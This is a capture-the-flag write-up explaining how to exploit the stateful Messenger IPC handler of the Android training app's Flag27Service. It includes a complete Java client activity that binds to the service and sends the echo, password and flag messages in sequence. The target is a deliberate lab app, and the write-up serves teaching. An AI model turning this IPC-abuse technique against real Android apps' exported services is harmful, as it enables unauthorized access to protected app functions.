---
title: Hextree Labs - Flag27Service Messenger Vulnerability (Solution) 
description: A short write-up on exploiting an Android Service vulnerability involving Messenger IPC and state management to retrieve a hidden flag. 
date: 2025-06-14 
tags: Android, CTF, Hextree Labs, Messenger, IPC, Vulnerability, Writeup, Reverse Engineering
---
## Introduction

This write-up covers the solution for the `Flag27Service` challenge from Hextree Labs. This challenge highlights a common Android Inter-Process Communication (IPC) vulnerability when services handle messages via `Messenger` and maintain state. The goal was to extract a hidden flag by interacting with the service in a specific sequence.

## Understanding the Target (`Flag27Service`)

The `Flag27Service` exposes a `Messenger` for IPC. Our analysis of its `IncomingHandler` revealed three key message types:

- **`MSG_ECHO (what = 1)`**: This message allows setting an `echo` string within the service's handler. This `echo` value is crucial for flag retrieval.
- **`MSG_GET_PASSWORD (what = 2)`**: This message triggers the service to generate a random UUID, store it internally as a `password`, and send this `password` back to the caller.
- **`MSG_GET_FLAG (what = 3)`**: This is the ultimate goal. To get the flag, two conditions must be met:
    1. The internally stored `echo` string must be exactly `"give flag"`.
    2. The `password` provided in the `MSG_GET_FLAG` message must match the `password` previously generated and stored by the service.

If both conditions are satisfied, the service launches `Flag27Activity`, passing the secret flag as an extra.

## The Vulnerability: Stateful Handler and `message.obj` Check

The `IncomingHandler` is instantiated once and maintains its `echo` and `password` states across different messages from clients. This statefulness, combined with a crucial check in `MSG_GET_PASSWORD`'s handler, formed the basis of our exploit.

The `MSG_GET_PASSWORD` block in `Flag27Service` had a specific check:

Java

```
if (message.obj == null) {
    Flag27Service.this.sendReply(message, "Error");
    return;
}
// ... proceed to generate and send password
```

This meant that if a client sent an `MSG_GET_PASSWORD` message with its `obj` field set to `null`, the service would immediately return an "Error" without providing the password.

## Exploitation Strategy

Our strategy was a precise three-step sequence to satisfy the conditions for `MSG_GET_FLAG`:

1. **Set the `echo` string**: Send an `MSG_ECHO` message with the data `"give flag"`. This preps the service's internal state.
2. **Obtain the `password`**: Send an `MSG_GET_PASSWORD` message, ensuring its `obj` field is **not null** (to bypass the service's check). The service will then generate a UUID password and send it back to our client. We must capture this password.
3. **Request the flag**: Send an `MSG_GET_FLAG` message, including the captured password in the message's `Bundle`.

## The Exploit Code (`HextreeActivity.java`)

We created an Android activity (`HextreeActivity`) to act as our client. It binds to the `Flag27Service` and orchestrates the message exchange.

```java
package com.example.hexatree;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class HextreeActivity extends AppCompatActivity {
    private TextView home_text;
    Messenger serviceMessenger = null;
    boolean isBound = false;

    Handler replyHandler = new Handler(Looper.getMainLooper()) {
        String password;

        @Override
        public void handleMessage(Message msg) {
            Bundle data = msg.getData();
            Log.d("CLIENT", "handleMessage what: " + msg.what + ", data: " + data);

            if (msg.what == 2) { // MSG_GET_PASSWORD reply
                String maybePassword = data.getString("password");
                Log.d("CLIENT", "Password received: " + maybePassword);

                if (maybePassword != null && maybePassword.length() > 5) {
                    password = maybePassword;

                    // Immediately send MSG_GET_FLAG with the received password
                    Message flagMsg = Message.obtain(null, 3); // MSG_GET_FLAG
                    Bundle b = new Bundle();
                    b.putString("password", password);
                    flagMsg.setData(b);
                    flagMsg.replyTo = new Messenger(this); // Set replyTo for the flag response
                    try {
                        serviceMessenger.send(flagMsg);
                        Log.d("CLIENT", "Sent MSG 3 (get flag) with password");
                    } catch (RemoteException e) {
                        e.printStackTrace();
                    }
                }
            } else if (msg.what == 3) { // MSG_GET_FLAG reply (from service's sendReply)
                String reply = data.getString("reply"); // Service sends "reply" key, not "flag"
                Log.d("CLIENT", "Flag attempt reply: " + reply);
                home_text.setText("Service Reply: " + reply);
                if (reply != null && reply.equals("success! Launching flag activity")) {
                    Log.d("CLIENT", "Flag activity should now be launched by the target service.");
                }
            }
        }
    };

    ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            serviceMessenger = new Messenger(service);
            isBound = true;
            Log.d("CLIENT", "Service Bound");
            sendMessageToService();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            serviceMessenger = null;
            isBound = false;
            Log.d("CLIENT", "Service Disconnected");
        }
    };

    public void sendMessageToService() {
        if (!isBound) return;

        // Step 1: Send MSG_ECHO to set the 'echo' string to "give flag"
        Message echoMsg = Message.obtain(null, 1); // MSG_ECHO
        Bundle echoData = new Bundle();
        echoData.putString("echo", "give flag");
        echoMsg.setData(echoData);
        echoMsg.replyTo = new Messenger(replyHandler);
        try {
            serviceMessenger.send(echoMsg);
            Log.d("CLIENT", "Sent MSG 1 (echo)");
        } catch (RemoteException e) {
            e.printStackTrace();
        }

        // Step 2: Send MSG_GET_PASSWORD with a non-null, Parcelable 'obj'
        // A slight delay is added to ensure MSG_ECHO is processed first.
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Message passMsg = Message.obtain(null, 2); // MSG_GET_PASSWORD

            // IMPORTANT: Set a Parcelable object to 'obj' to bypass the service's check
            passMsg.obj = new Bundle(); // Bundle is Parcelable

            passMsg.replyTo = new Messenger(replyHandler);
            try {
                serviceMessenger.send(passMsg);
                Log.d("CLIENT", "Sent MSG 2 (get password)");
            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }, 500); // 500ms delay
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        home_text = findViewById(R.id.home_text);
        Button attackButton = findViewById(R.id.attack);

        attackButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            // Target the Flag27Service in the 'io.hextree.attacksurface' package
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
            bindService(intent, connection, Context.BIND_AUTO_CREATE);
            home_text.setText("Attacking...");
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isBound) {
            Log.d("HEXTREE", "Unbinding service.");
            unbindService(connection);
            isBound = false;
        }
    }
}
```

## Execution and Results

1. **Install the target application** (`io.hextree.attacksurface`) on an Android device or emulator.
2. **Build and install our exploit application** (`com.example.hexatree`).
3. **Launch `HextreeActivity`** and tap the "Attack" button.
4. **Monitor Logcat**: You'll observe the following sequence:
    - Client sending `MSG_ECHO`.
    - Client sending `MSG_GET_PASSWORD` with `obj` as a `Bundle`.
    - Client receiving the UUID password from the service.
    - Client immediately sending `MSG_GET_FLAG` with the captured password.
    - Service replying "success! Launching flag activity".
5. **Flag Activity Launch**: The `Flag27Activity` from the target application (`io.hextree.attacksurface`) will appear on the screen, revealing the flag.

This challenge demonstrates how improper validation of IPC message contents and reliance on internal state can lead to a straightforward but effective exploit. It reinforces the importance of careful design when exposing functionalities via Android services.

